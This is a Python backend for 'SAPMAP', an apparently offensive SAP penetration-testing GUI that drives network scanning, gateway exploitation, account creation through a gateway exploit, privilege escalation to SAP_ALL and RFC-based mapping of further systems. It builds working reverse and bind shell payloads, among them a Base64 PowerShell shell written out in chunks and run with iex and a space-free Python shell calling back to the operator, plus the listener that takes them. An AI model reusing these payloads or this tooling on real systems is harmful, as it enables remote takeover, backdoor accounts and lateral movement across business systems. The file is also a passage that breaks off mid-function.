#!/usr/bin/env python3
"""
SAPMAP GUI Backend — Bottle HTTP server providing REST API for the frontend.

Mirrors the SAPology_gui.py architecture: Bottle + pywebview (or browser).
All operations run in background threads; JS polls for state updates.
"""

import io
import json
import os
import sys
import threading
import time
from datetime import datetime

from bottle import Bottle, request, response, static_file

from sapmap_models import (SAPMAPState, SAPNode, InstanceInfo, RFCConnection,
                           Credentials, CreatedUser)
from sapmap_html import get_html
import sapmap_scanner
import sapmap_rfc
import sapmap_exploit
import sapmap_cleanup
import sapmap_secstore
import sapmap_state as state_mgr

def _derive_sid(destination_name: str, host: str) -> str:
    """Derive a SID from an RFC destination name or hostname.

    Common patterns: DEST_SID, SID_DEST, PREFIX_SID_SUFFIX.
    Falls back to first 3 chars of hostname uppercased.
    """
    import re
    name = destination_name.upper().strip()
    # Try to extract a 3-char alphanumeric segment that looks like a SID
    # Skip common prefixes: SAP, RFC, SM_, SAPMAP_, SAPHOUND_
    cleaned = re.sub(r'^(SAPMAP_|SAPHOUND_|SAP_|RFC_|SM_)', '', name)
    parts = re.split(r'[_\-]', cleaned)
    skip = {'TO', 'IN', 'OF', 'ON', 'AT', 'BY', 'CLNT', 'DEST',
            'CONN', 'TEST', 'PROD', 'DEV', 'QAS'}
    # Prefer 3-char segments first
    for p in parts:
        p = p.strip()
        if len(p) == 3 and p.isalnum() and not p.isdigit() and p not in skip:
            return p
    for p in parts:
        p = p.strip()
        if 2 <= len(p) <= 4 and p.isalnum() and not p.isdigit() and p not in skip:
            return p[:3]
    # Try to extract a 3-char SID from longer segments (e.g. S4HCLNT001)
    for p in parts:
        p = p.strip()
        if len(p) > 4:
            candidate = p[:3]
            if candidate.isalnum() and not candidate.isdigit():
                return candidate
    # Fallback: use host
    h = host.upper().replace('.', '_').replace('-', '_')
    parts = h.split('_')
    for p in parts:
        if 2 <= len(p) <= 4 and p.isalnum() and not p.isdigit():
            return p[:3]
    return h[:3] if len(h) >= 3 else "UNK"


def _resolve_host(host: str) -> str:
    """Resolve a hostname to an IP address. Returns '' on failure."""
    import socket
    # If it already looks like an IP, return as-is
    try:
        socket.inet_aton(host)
        return host
    except socket.error:
        pass
    try:
        return socket.gethostbyname(host)
    except socket.gaierror:
        return ""


# ===========================================================================
# Console line buffer (same pattern as SAPology GUI)
# ===========================================================================

_console_lines = []
_console_lock = threading.Lock()


def _add_console_line(ts, text, css_class="cl-info"):
    with _console_lock:
        _console_lines.append({"ts": ts, "text": text, "cls": css_class})


class OutputCapture(io.TextIOBase):
    """Intercept stdout and push lines to the shared console buffer."""

    def __init__(self, original_stdout):
        self.original = original_stdout
        self.buffer = ""
        self.lock = threading.Lock()

    def write(self, text):
        if self.original:
            try:
                self.original.write(text)
            except Exception:
                pass

        with self.lock:
            self.buffer += text
            while "\r" in self.buffer and "\n" not in self.buffer:
                idx = self.buffer.rfind("\r")
                self.buffer = self.buffer[idx + 1:]
            while "\n" in self.buffer:
                line, self.buffer = self.buffer.split("\n", 1)
                line = line.rstrip("\r")
                if line.strip():
                    self._push_line(line)
        return len(text)

    def _push_line(self, line):
        css_class = "cl-info"
        if line.lstrip().startswith("[+]") or "detected" in line.lower():
            css_class = "cl-ok"
        elif line.lstrip().startswith("[-]") or "error" in line.lower():
            css_class = "cl-err"
        elif line.lstrip().startswith("[!]"):
            css_class = "cl-warn"
        elif line.lstrip().startswith("[*]"):
            css_class = "cl-info"
        elif "CRITICAL" in line or "SAP_ALL" in line:
            css_class = "cl-crit"
        elif line.lstrip().startswith("===") or line.lstrip().startswith("---"):
            css_class = "cl-dim"

        escaped = (line
                   .replace("&", "&amp;")
                   .replace("<", "&lt;")
                   .replace(">", "&gt;"))

        ts = datetime.now().strftime("%H:%M:%S")
        _add_console_line(ts, escaped, css_class)

    def flush(self):
        with self.lock:
            stripped = self.buffer.strip().rstrip("\r")
            if stripped:
                self._push_line(stripped)
                self.buffer = ""
        if self.original:
            try:
                self.original.flush()
            except Exception:
                pass

    def isatty(self):
        return False


# ===========================================================================
# Active-task tracker (thread-safe)
# ===========================================================================

_active_tasks = {}          # key → description, e.g. "NPL:rfc_system_info" → "RFC System Info"
_active_tasks_lock = threading.Lock()


def _task_start(key: str, label: str = ""):
    with _active_tasks_lock:
        _active_tasks[key] = label or key


def _task_end(key: str):
    with _active_tasks_lock:
        _active_tasks.pop(key, None)


def _get_active_tasks() -> dict:
    with _active_tasks_lock:
        return dict(_active_tasks)


def _bg(key: str, label: str, fn):
    """Launch *fn* in a daemon thread with task tracking."""
    def _wrapper():
        _task_start(key, label)
        try:
            fn()
        finally:
            _task_end(key)
    threading.Thread(target=_wrapper, daemon=True).start()


# ===========================================================================
# Reverse Shell Session
# ===========================================================================

import socket as _socket_mod

_shell_session = None
_shell_lock = threading.Lock()


class ShellSession:
    """Manages a single reverse shell TCP connection."""

    def __init__(self, port: int, target_sid: str, mode: str = "reverse"):
        self.port = port
        self.target_sid = target_sid
        self.mode = mode           # "reverse" or "bind"
        self.status = "idle"       # idle/waiting/connected/disconnected/error
        self.error_msg = ""
        self.server_sock = None
        self.client_sock = None
        self.client_addr = None
        self.target_host = ""      # for bind mode: target IP to connect to
        self.output_buffer = []
        self.output_lock = threading.Lock()

    def start_listener(self):
        """Bind TCP listener and wait for reverse shell connection."""
        try:
            self.server_sock = _socket_mod.socket(
                _socket_mod.AF_INET, _socket_mod.SOCK_STREAM)
            self.server_sock.setsockopt(
                _socket_mod.SOL_SOCKET, _socket_mod.SO_REUSEADDR, 1)
            self.server_sock.bind(("0.0.0.0", self.port))
            self.server_sock.listen(1)
            self.status = "waiting"
            threading.Thread(target=self._listener_loop, daemon=True).start()
        except OSError as e:
            self.status = "error"
            self.error_msg = f"Cannot bind port {self.port}: {e}"

    def _listener_loop(self):
        try:
            self.server_sock.settimeout(120)
            self.client_sock, self.client_addr = self.server_sock.accept()
            self.client_sock.settimeout(None)  # blocking for reader
            self.status = "connected"
            self.server_sock.close()
            self.server_sock = None
            threading.Thread(target=self._reader_loop, daemon=True).start()
        except _socket_mod.timeout:
            self.status = "error"
            self.error_msg = "Timeout — no reverse shell connection received"
            self._close_server()
        except Exception as e:
            self.status = "error"
            self.error_msg = str(e)
            self._close_server()

    def start_connector(self, target_host: str, saprouter: str = ""):
        """Connect TO a bind shell on the target (bind mode)."""
        self.target_host = target_host
        self.status = "waiting"
        threading.Thread(
            target=self._connector_loop,
            args=(target_host, saprouter),
            daemon=True).start()

    def _connector_loop(self, target_host, saprouter):
        """Try to connect to the bind shell with retries."""
        import time
        for attempt in range(30):  # retry for 30 seconds
            if self.status != "waiting":
                return
            try:
                if saprouter:
                    from sap_saprouter import (connect_through_saprouter,
                                               build_route_for_port)
                    route = build_route_for_port(
                        saprouter, target_host, self.port)
                    self.client_sock = connect_through_saprouter(
                        route, timeout=5)
                else:
                    self.client_sock = _socket_mod.socket(
                        _socket_mod.AF_INET, _socket_mod.SOCK_STREAM)
                    self.client_sock.settimeout(5)
                    self.client_sock.connect((target_host, self.port))
                self.client_sock.settimeout(None)  # blocking for reader
                self.client_addr = (target_host, self.port)
                self.status = "connected"
                print(f"[+] Bind shell connected to "
                      f"{target_host}:{self.port}")
                threading.Thread(
                    target=self._reader_loop, daemon=True).start()
                return
            except Exception as e:
                print(f"[*] Bind shell connect attempt {attempt+1}/30 "
                      f"to {target_host}:{self.port}: {e}")
                time.sleep(1)
        self.status = "error"
        self.error_msg = (f"Could not connect to bind shell at "
                          f"{target_host}:{self.port} after 30 attempts")

    def _reader_loop(self):
        try:
            while self.status == "connected":
                data = self.client_sock.recv(4096)
                if not data:
                    self.status = "disconnected"
                    break
                with self.output_lock:
                    self.output_buffer.append(
                        data.decode("utf-8", errors="replace"))
        except Exception:
            if self.status == "connected":
                self.status = "disconnected"

    def send_input(self, text: str):
        if self.status == "connected" and self.client_sock:
            try:
                self.client_sock.sendall((text + "\n").encode())
            except Exception:
                self.status = "disconnected"

    def get_output(self) -> str:
        with self.output_lock:
            out = "".join(self.output_buffer)
            self.output_buffer.clear()
            return out

    def stop(self):
        self.status = "disconnected"
        self._close_client()
        self._close_server()

    def _close_server(self):
        if self.server_sock:
            try:
                self.server_sock.close()
            except Exception:
                pass
            self.server_sock = None

    def _close_client(self):
        if self.client_sock:
            try:
                self.client_sock.close()
            except Exception:
                pass
            self.client_sock = None


def _detect_local_ip(target_host: str, saprouter: str = "") -> str:
    """Detect which local IP can reach the target (or SAProuter first hop)."""
    # For SAProuter, we need to reach the router, not the final target
    reach_host = target_host
    if saprouter:
        try:
            from sap_saprouter import parse_route_string
            hops = parse_route_string(saprouter + f"/H/{target_host}/S/3200")
            reach_host = hops[0]["host"]
        except Exception:
            pass
    try:
        s = _socket_mod.socket(_socket_mod.AF_INET, _socket_mod.SOCK_DGRAM)
        s.connect((reach_host, 1))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1"


def _win_multistep_payload(ps_script: str, display: str) -> dict:
    """Build a multi-step Windows payload: write PS script to temp file,
    then execute it.

    EXTPROG is only 128 bytes in the SAPXPG protocol. PowerShell
    EncodedCommand payloads are ~1100 chars, so they get truncated.
    Instead, write the Base64-encoded script to a temp file in chunks
    via multiple 'cmd.exe /C echo ... >> file' calls, then run
    PowerShell to decode and execute from that file.

    Returns a dict with "steps" (list of command/params dicts) and
    a final "command"/"params" that is the execute step.
    """
    import base64
    enc = base64.b64encode(ps_script.encode("utf-16-le")).decode("ascii")
    tmp = r"C:\Windows\Temp\s"

    # Split Base64 into chunks that fit in EXTPROG (128 bytes).
    # "cmd.exe /C echo CHUNK>>C:\Windows\Temp\s" = ~42 overhead
    chunk_size = 80
    chunks = [enc[i:i+chunk_size] for i in range(0, len(enc), chunk_size)]

    steps = []
    for idx, chunk in enumerate(chunks):
        redir = ">" if idx == 0 else ">>"
        steps.append({
            "command": f"cmd.exe /C echo {chunk}{redir}{tmp}",
            "params": "",
        })

    # Read Base64 file with gc (Get-Content), join lines, decode
    # UTF-16LE and execute. No -Raw (PS v2 compat), no certutil.
    # gc reads lines, -join'' concatenates, then decode+exec.
    run_cmd = (f"powershell -nop -c \"$b=(gc '{tmp}')-join'';"
               f"iex([Text.Encoding]::Unicode.GetString("
               f"[Convert]::FromBase64String($b)))\"")
    assert len(run_cmd) <= 128, f"Execute cmd too long: {len(run_cmd)}"
    return {
        "steps": steps,
        "command": run_cmd,
        "params": "",
        "display": display,
    }


def _generate_payload(os_type: str, ip: str, port: int) -> dict:
    """Generate reverse shell payload based on OS type."""
    is_win = any(w in (os_type or "").lower() for w in ("windows", "nt", "win"))
    if is_win:
        ps = (f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
              f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
              f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
              f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
              f"$r=(iex $d 2>&1|Out-String);"
              f"$p=$r+'PS '+$(pwd).Path+'> ';"
              f"$t=([text.encoding]::ASCII).GetBytes($p);"
              f"$s.Write($t,0,$t.Length);$s.Flush()}};$c.Close()")
        return _win_multistep_payload(ps, f"PowerShell reverse shell → {ip}:{port}")
    else:
        # SAPXPG splits PARAMS at spaces (execvp argv splitting).
        # With EXTPROG=python3 and PARAMS="-c <code>", SAPXPG produces
        # ["python3", "-c", "<code>"] which is correct — python3 gets
        # -c as flag and the code as a single argument.
        #
        # The code MUST have ZERO spaces. Use __import__() instead of
        # bare "import" statements, and semicolons for multi-statements.
        py_code = (
            f"s=__import__('socket').socket(2,1);"
            f"s.connect(('{ip}',{port}));"
            f"__import__('os').dup2(s.fileno(),0);"
            f"__import__('os').dup2(s.fileno(),1);"
            f"__import__('os').dup2(s.fileno(),2);"
            f"__import__('subprocess').call(['/bin/bash','-i'])"
        )
        assert " " not in py_code, f"Space in payload: {py_code}"
        return {
            "command": "python3",
            "params": f"-c {py_code}",
            "display": f"Python3 reverse shell → {ip}:{port}",
        }


def _generate_bind_payload(os_type: str, port: int) -> dict:
    """Generate bind shell payload — opens a listening port on the target."""
    is_win = any(w in (os_type or "").lower() for w in ("windows", "nt", "win"))
    if is_win:
        ps = (f"$l=New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any,{port});"
              f"$l.Start();"
              f"$c=$l.AcceptTcpClient();"
              f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
              f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
              f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
              f"$r=(iex $d 2>&1|Out-String);"
              f"$p=$r+'PS '+$(pwd).Path+'> ';"
              f"$t=([text.encoding]::ASCII).GetBytes($p);"
              f"$s.Write($t,0,$t.Length);$s.Flush()}};$c.Close();$l.Stop()")
        return _win_multistep_payload(ps, f"PowerShell bind shell on port {port}")
    else:
        # Bind shell: listen on target, SAPMAP connects to it.
        # Zero spaces, under 255 chars (SXPG PARAMS limit).
        # Use short aliases: o=os, d=dup2, f=fileno
        py_code = (
            f"import(socket,os,subprocess);"  # dummy — replaced below
        )
        # Build compact code under 250 chars.
        # CRITICAL: must fork() so the bind shell survives after
        # SAPXPG/GW connection closes (P4 timeout kills the process).
        # Close fd 1+2 after fork so SXPG's stdout pipe gets EOF
        # and the RFC call returns (otherwise SXPG blocks forever).
        py_code = (
            f"o=__import__('os');"
            f"o.fork()and(o._exit(0));"
            f"o.close(1);o.close(2);"
            f"s=__import__('socket').socket(2,1);"
            f"s.setsockopt(1,2,1);"
            f"s.bind(('',{port}));"
            f"s.listen(1);"
            f"c,a=s.accept();"
            f"[o.dup2(c.fileno(),i)for(i)in(0,1,2)];"
            f"o.execv('/bin/bash',['/bin/bash','-i'])"
        )
        assert " " not in py_code, f"Space in bind payload: {py_code}"
        assert len(py_code) < 252, f"Bind payload too long: {len(py_code)} chars"
        return {
            "command": "python3",
            "params": f"-c {py_code}",
            "display": f"Python3 bind shell on target port {port}",
        }


# ===========================================================================
# SAPMAPApi — Backend controller
# ===========================================================================

class SAPMAPApi:
    """Backend controller for SAPMAP operations."""

    def __init__(self):
        self.state = SAPMAPState()
        self.scan_thread = None
        self.scan_running = False
        self.scan_cancelled = False
        self.cancel_event = threading.Event()
        self.scan_state = "idle"  # idle, running, complete, cancelled, error
        self.scan_error = ""
        self.operation_lock = threading.Lock()

    def start_scan(self, config):
        if self.scan_running:
            return {"error": "Scan already running"}

        self.scan_running = True
        self.scan_cancelled = False
        self.cancel_event.clear()
        self.scan_state = "running"
        self.scan_error = ""

        # Clear console
        global _console_lines
        with _console_lock:
            _console_lines = []

        def _scan_fn():
            _task_start("_scan", "Network Scan")
            try:
                self._run_scan(config)
            finally:
                _task_end("_scan")
        self.scan_thread = threading.Thread(target=_scan_fn, daemon=True)
        self.scan_thread.start()
        return {"status": "started"}

    def _run_scan(self, config):
        try:
            targets_str = config.get("targets", "")
            inst_from = config.get("inst_from", 0)
            inst_to = config.get("inst_to", 99)
            threads = config.get("threads", 30)
            timeout = config.get("timeout", 3)
            fast_mode = config.get("fast_mode", True)

            # Advanced scan parameters
            concurrent_hosts = config.get("concurrent_hosts", 5)
            port_timeout = config.get("port_timeout", 3.0)
            alive_timeout = config.get("alive_timeout", 0.5)
            skip_alive = config.get("skip_alive", False)

            # Pass advanced params via module-level config
            sapmap_scanner.ALIVE_TIMEOUT = alive_timeout

            targets = sapmap_scanner.parse_targets(targets_str)
            if not targets:
                print("[-] No valid targets found")
                self.scan_state = "error"
                self.scan_error = "No valid targets"
                self.scan_running = False
                return

            self.state.scan_config = config

            nodes = sapmap_scanner.discover_systems(
                targets,
                instance_range=(inst_from, inst_to),
                timeout=timeout,
                threads=threads,
                fast_mode=fast_mode,
                cancel_event=self.cancel_event,
                verbose=True,
                skip_alive=skip_alive,
                concurrent_hosts=concurrent_hosts,
                port_timeout=port_timeout,
                node_callback=lambda node: self.state.add_node(node),
            )

            # Add any nodes that weren't already added via callback (e.g. deep mode)
            for node in nodes:
                if node.sid not in self.state.nodes:
                    self.state.add_node(node)

            if self.cancel_event.is_set():
                self.scan_state = "cancelled"
            else:
                self.scan_state = "complete"

        except Exception as e:
            self.scan_state = "error"
            self.scan_error = str(e)
            print(f"[-] Scan error: {e}")
        finally:
            self.scan_running = False

    def stop_scan(self):
        self.cancel_event.set()
        self.scan_cancelled = True
        print("[!] Stop requested — cancelling scan ...")
        return {"status": "stopping"}

    def get_state_dict(self):
        """Get current state as a dict for the frontend."""
        d = self.state.to_dict()
        d["scan_state"] = self.scan_state
        d["scan_error"] = self.scan_error
        d["stats"] = self.state.stats()
        d["active_tasks"] = _get_active_tasks()
        return d


# ===========================================================================
# Bottle app with routes
# ===========================================================================

def create_app(api: SAPMAPApi) -> Bottle:
    app = Bottle()

    # -- Serve the SPA --
    @app.route("/")
    def index():
        response.content_type = "text/html; charset=utf-8"
        response.set_header("Cache-Control", "no-cache, no-store, must-revalidate")
        return get_html()

    # -- Console polling --
    @app.route("/api/console")
    def get_console():
        response.content_type = "application/json"
        cursor = int(request.params.get("cursor", 0))
        with _console_lock:
            # Reset cursor if buffer was cleared (new scan started)
            if cursor > len(_console_lines):
                cursor = 0
            lines = _console_lines[cursor:]
            new_cursor = len(_console_lines)
        return json.dumps({"lines": lines, "cursor": new_cursor})

    # -- State --
    @app.route("/api/state")
    def get_state():
        response.content_type = "application/json"
        return json.dumps(api.get_state_dict(), default=str)

    # -- Scan control --
    @app.route("/api/scan/start", method="POST")
    def scan_start():
        response.content_type = "application/json"
        config = request.json or {}
        return json.dumps(api.start_scan(config))

    @app.route("/api/scan/stop", method="POST")
    def scan_stop():
        response.content_type = "application/json"
        return json.dumps(api.stop_scan())

    # -- Node operations --
    @app.route("/api/node/<sid>/credentials", method="POST")
    def node_credentials(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        creds = Credentials(
            username=data.get("username", ""),
            password=data.get("password", ""),
            client=data.get("client", "100"),
            instance_nr=data.get("instance_nr", "00"),
        )

        if data.get("test_only"):
            ok = sapmap_rfc.test_connection(node, creds)
            return json.dumps({"success": ok, "message": "OK" if ok else "Failed"})

        # Test and save credentials
        print(f"[*] Testing credentials for {sid}: user={creds.username}, "
              f"client={creds.client}, instance={creds.instance_nr}")
        creds.verified = sapmap_rfc.test_connection(node, creds)
        node.credentials.append(creds)
        if creds.verified:
            print(f"[+] Credentials saved and verified for {sid}")
        else:
            print(f"[!] Credentials saved for {sid} but could NOT verify — "
                  f"check the error above. User creation will likely fail.")
        return json.dumps({"success": True, "verified": creds.verified})

    @app.route("/api/node/<sid>/deep_scan", method="POST")
    def node_deep_scan(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            sapmap_scanner.deep_scan_single(node)
        _bg(f"{sid}:deep_scan", "Deep Scan", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/set_type", method="POST")
    def node_set_type(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        new_type = data.get("system_type", "").strip()
        if new_type:
            node.system_type = new_type
            print(f"[*] System type for {sid} set to: {new_type}")
        return json.dumps({"status": "ok"})

    @app.route("/api/node/<sid>/set_db_type", method="POST")
    def node_set_db_type(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        new_db = data.get("db_type", "").strip()
        if new_db:
            node.db_type = new_db
            print(f"[*] DB type for {sid} set to: {new_db}")
        return json.dumps({"status": "ok"})

    @app.route("/api/node/<sid>/set_os_type", method="POST")
    def node_set_os_type(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        new_os = data.get("os_type", "").strip()
        if new_os:
            node.os_type = new_os
            print(f"[*] OS type for {sid} set to: {new_os}")
        return json.dumps({"status": "ok"})

    @app.route("/api/node/<sid>/set_saprouter", method="POST")
    def node_set_saprouter(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        new_router = data.get("saprouter", "").strip()
        node.saprouter = new_router
        if new_router:
            print(f"[*] SAProuter for {sid} set to: {new_router}")
        else:
            print(f"[*] SAProuter for {sid} removed")
        return json.dumps({"status": "ok"})

    @app.route("/api/node/<sid>/rfc_system_info", method="POST")
    def node_rfc_system_info(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            # Find gateway port
            gw_port = None
            for inst in node.instances:
                for port, svc in inst.ports.items():
                    if svc == "gateway" or (3300 <= port <= 3399):
                        gw_port = port
                        break
                if gw_port:
                    break
            if not gw_port:
                print(f"[-] No gateway port found for {node.sid}")
                return
            host = node.ip or node.hostname
            if node.saprouter:
                print(f"[*] {node.sid}: Using SAProuter: {node.saprouter}")
            # Pass known instance numbers so SAPControl queries the right one
            inst_nrs = [inst.instance_nr for inst in node.instances
                        if inst.instance_nr is not None]
            info = sapmap_scanner.enrich_system_info(
                host, gw_port, instance_nrs=inst_nrs,
                sid_hint=node.sid, saprouter=node.saprouter)
            # Update node with retrieved info
            if info.get("sid") and not node.sid.startswith("UNK"):
                pass  # keep existing SID
            elif info.get("sid"):
                node.sid = info["sid"]
            if info.get("hostname"):
                node.hostname = info["hostname"]
            if info.get("os_type"):
                node.os_type = info["os_type"]
            if info.get("db_type"):
                node.db_type = info["db_type"]
            if info.get("kernel"):
                node.kernel = info["kernel"]
            if info.get("sap_release"):
                node.sap_release = info["sap_release"]

            # Set system type from SAPControl ABAP/JAVA detection
            sc_abap = info.get("_is_abap", False)
            sc_java = info.get("_is_java", False)
            if sc_abap or sc_java:
                if sc_abap and sc_java:
                    node.system_type = "ABAP+JAVA"
                elif sc_java:
                    node.system_type = "JAVA"
                else:
                    node.system_type = "ABAP"

            # Database port fingerprinting (if DB not yet known)
            if not node.db_type:
                inst_nrs = node.instance_nrs() or ["00"]
                db_ports = []
                for nr in inst_nrs:
                    n = int(nr)
                    db_ports.append((30000 + n * 100 + 13, "HDB"))   # HANA SystemDB
                    db_ports.append((30000 + n * 100 + 15, "HDB"))   # HANA tenant
                db_ports += [(7210, "ADA"), (1433, "MSS"),
                             (1521, "ORA"), (50000, "DB6")]
                print(f"[*] Scanning database ports on {host}...")
                for port, db_name in db_ports:
                    if sapmap_scanner._scan_port(host, port, timeout=2.0):
                        node.db_type = db_name
                        print(f"[+] Database detected: {db_name} "
                              f"(port {port} open on {host})")
                        break
                if not node.db_type:
                    print(f"[*] No database ports detected on {host}")

        _bg(f"{sid}:rfc_system_info", "RFC System Info", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_gw", method="POST")
    def node_check_gw(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            sapmap_exploit.check_gw_vulnerable(node)

        _bg(f"{sid}:check_gw", "Check Gateway", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/create_user", method="POST")
    def node_create_user(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        method = data.get("method", "credentials")

        def _run():
            if method == "gw_exploit":
                created = sapmap_exploit.create_user_gw_exploit(node, api.state)
            else:
                created = sapmap_exploit.create_user_via_credentials(node, api.state)
            if created:
                api.state.track_created_user(created)
                sapmap_exploit._post_exploit_enrichment(node, api.state)

        _bg(f"{sid}:create_user", "Create User", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/lpe", method="POST")
    def node_lpe(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        method = data.get("method")  # None = try all

        def _run():
            creds = node.best_credentials()
            if not creds:
                print(f"[-] No credentials available for {sid}")
                return
            import sapmap_lpe
            success = sapmap_lpe.try_lpe(node, creds, method_name=method)
            if success:
                print(f"[+] LPE succeeded on {sid} — "
                      f"{creds.username} now has SAP_ALL")

        _bg(f"{sid}:lpe", "Local Privilege Escalation", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/retrieve_rfcs", method="POST")
    def node_retrieve_rfcs(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            creds = node.best_credentials()
            conns = sapmap_rfc.retrieve_rfc_connections(node, creds)
            print(f"[+] Retrieved {len(conns)} RFC connections from {sid}")

            # Track discovered systems to avoid duplicate pings
            # Key: (host, instance_nr) → dest_name for dedup
            discovered = {}

            for conn in conns:
                # Detect self-referencing RFC destinations
                th = (conn.target_host or '').strip().lower()
                ti = (conn.target_ip or '').strip()
                own_names = {s.lower() for s in [
                    node.hostname, node.ip, 'localhost', '127.0.0.1',
                ] if s}
                own_names.update(h.lower() for h in node.all_hostnames())
                own_names.update(node.all_ips())
                is_self = (not th and not ti) or th in own_names or ti in own_names
                # Same host but different instance = NOT self
                if is_self and conn.target_instance_nr:
                    own_instances = set(node.instance_nrs())
                    target_inst = conn.target_instance_nr.strip().zfill(2)
                    if own_instances and target_inst not in own_instances:
                        is_self = False
                if is_self:
                    conn.target_host = node.hostname or node.ip
                    conn.target_sid = node.sid
                else:
                    target = api.state.find_node_by_host(
                        hostname=conn.target_host, ip=conn.target_ip,
                        instance_nr=conn.target_instance_nr or "",
                    )
                    if target:
                        conn.target_sid = target.sid
                api.state.add_connection(conn)

            # Ping each non-self connection and auto-discover systems
            # DEST_CHECK_CONNECTION returns the remote SID so we can
            # do SID-first mapping instead of host-first.
            non_self = [c for c in conns
                        if c.target_sid != sid and c.target_host]

            if non_self:
                print(f"[*] Pinging {len(non_self)} remote RFC destinations...")

            # discovered: (host, inst) → {dest_name, remote_sid, remote_host}
            discovered = {}

            for conn in non_self:
                host = conn.target_ip or conn.target_host or ""
                inst = conn.target_instance_nr or "00"
                key = (host.lower(), inst)

                if key in discovered:
                    # Already pinged this host+instance, reuse SID
                    prev = discovered[key]
                    conn.ping_ok = True
                    conn.tested = True
                    if prev.get("remote_sid"):
                        conn.target_sid = prev["remote_sid"]
                    api.state.add_connection(conn)
                    time.sleep(0.4)
                    continue

                print(f"[*] Ping {conn.destination_name} → "
                      f"{host}...")
                ping = sapmap_rfc.ping_rfc_destination(
                    node, conn.destination_name, creds
                )

                if ping["ping_ok"]:
                    dest_sid = ping.get("remote_sid", "").strip()
                    remote_ip = ping.get("remote_ip", "").strip()
                    remote_host = (
                        ping.get("remote_hostname", "").strip()
                        or conn.target_host or host)
                    # If target_host was a hostname (not IP), use the
                    # IP returned by RFC_SYSTEM_INFO on the SAP system
                    if remote_ip and remote_ip != host:
                        print(f"[*] Resolved {host} → {remote_ip} "
                              f"(via RFC_SYSTEM_INFO)")
                        conn.target_ip = remote_ip
                        host = remote_ip
                        key = (host.lower(), inst)  # update dedup key
                    print(f"[+] {conn.destination_name}: alive"
                          f"{f' (SID={dest_sid})' if dest_sid else ''}"
                          f" ({ping['ping_message'][:60]})")
                    conn.ping_ok = True
                    conn.tested = True
                    discovered[key] = {
                        "dest_name": conn.destination_name,
                        "remote_sid": "",  # set below once resolved
                        "remote_host": remote_host,
                    }

                    # ---- SID-first mapping ----
                    # 1. If we got a remote SID, look it up directly
                    if dest_sid:
                        existing_sid_node = api.state.get_node(dest_sid)
                        if existing_sid_node:
                            conn.target_sid = dest_sid
                            discovered[key]["remote_sid"] = dest_sid
                            api.state.add_connection(conn)
                            time.sleep(0.6)
                            if dest_sid == node.sid:
                                print(f"[*] {conn.destination_name}: "
                                      f"self-reference ({node.sid})")
                            else:
                                print(f"[*] {conn.destination_name}: "
                                      f"maps to existing {dest_sid}")
                            continue

                    # 2. Fall back to host+instance matching
                    existing = api.state.find_node_by_host(
                        hostname=host, ip=host, instance_nr=inst)
                    if existing:
                        conn.target_sid = existing.sid
                        discovered[key]["remote_sid"] = existing.sid
                        api.state.add_connection(conn)
                        time.sleep(0.6)
                        if existing.sid == node.sid:
                            print(f"[*] {conn.destination_name}: "
                                  f"self-reference ({node.sid})")
                        else:
                            print(f"[*] {conn.destination_name}: "
                                  f"maps to existing {existing.sid}")
                        continue

                    # 3. No existing node — use SID from ping or derive
                    if not dest_sid:
                        dest_sid = _derive_sid(
                            conn.destination_name, host)
                        print(f"[*] Could not get remote SID, "
                              f"using derived: {dest_sid}")

                    # Check if SID already on map but different host
                    existing_sid_node = api.state.get_node(dest_sid)
                    if existing_sid_node:
                        # Same SID exists — verify it's the same system
                        existing_ips = existing_sid_node.all_ips()
                        existing_names = existing_sid_node.all_hostnames()
                        is_same = False

                        if host in existing_ips or host.lower() in existing_names:
                            is_same = True

                        if not is_same:
                            resolved_ip = _resolve_host(host)
                            if resolved_ip and resolved_ip in existing_ips:
                                is_same = True

                        if not is_same and existing_sid_node.hostname:
                            existing_resolved = _resolve_host(
                                existing_sid_node.hostname)
                            rfc_resolved = _resolve_host(host)
                            if (existing_resolved and rfc_resolved
                                    and existing_resolved == rfc_resolved):
                                is_same = True

                        if not is_same and remote_host:
                            if (remote_host in existing_ips or
                                    remote_host.lower() in existing_names):
                                is_same = True
                            else:
                                rh_ip = _resolve_host(remote_host)
                                if rh_ip and rh_ip in existing_ips:
                                    is_same = True

                        if is_same and inst:
                            existing_insts = existing_sid_node.instance_nrs()
